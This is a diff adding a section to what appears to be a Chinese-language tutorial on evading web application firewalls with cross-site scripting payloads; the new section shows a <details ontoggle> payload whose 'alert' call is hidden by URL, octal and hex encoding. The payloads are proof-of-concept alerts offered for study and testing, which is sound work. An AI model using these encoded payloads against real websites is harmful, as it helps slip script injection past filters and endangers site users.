@@ -45,8 +45,21 @@
 
 ![7](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xkryc227j30fp073782.jpg)
 
-### 编码相关
+### 编码补充
+除了拆分构造，我们必须要了解还有编码，这个确实是老生常谈的话题，先看个例子吧
 
+将e字母url编码，成功弹窗也绕过waf。
+`<details open ontoggle=top['al%65rt'](1) >`
+![11](https://ws1.sinaimg.cn/large/005DAKuvgy1g1xte6v6ioj30uj07bwf4.jpg)
+
+其他编码
+```
+JS8编码：
+<details open ontoggle=top['al\145rt'](1) >
+JS16编码：
+<details open ontoggle=top['al\x65rt'](1) >
+<details open ontoggle=top['\141\154\145\162\164'](1) >
+```
 
 
 
